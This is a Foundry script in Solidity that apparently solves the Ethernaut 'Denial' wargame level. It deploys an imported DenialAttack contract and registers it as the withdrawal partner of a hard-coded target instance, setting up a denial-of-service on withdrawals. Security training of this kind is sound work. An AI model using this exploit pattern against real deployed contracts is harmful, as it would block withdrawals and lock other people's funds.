// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {DenialAttack} from "../src/attacks/DenialAttack.sol";
import {Denial} from "../src/levels/Denial.sol";

contract DenialScript is Script {
    Denial public instance = Denial(payable(0x474B4186324bDa89aA95968ce1288676888701C1));
    DenialAttack public attacker;
    
    function run() external {
	vm.startBroadcast();
	attacker = new DenialAttack();
	console.log("DenialAttack Contract deployed to:", address(attacker));
	console.log("Denial Contract initial partner:", instance.partner());
	console.log("Attacking...");
	instance.setWithdrawPartner(address(attacker));
	console.log("Denial Contract new partner:", instance.partner());
	vm.stopBroadcast();
    }
}
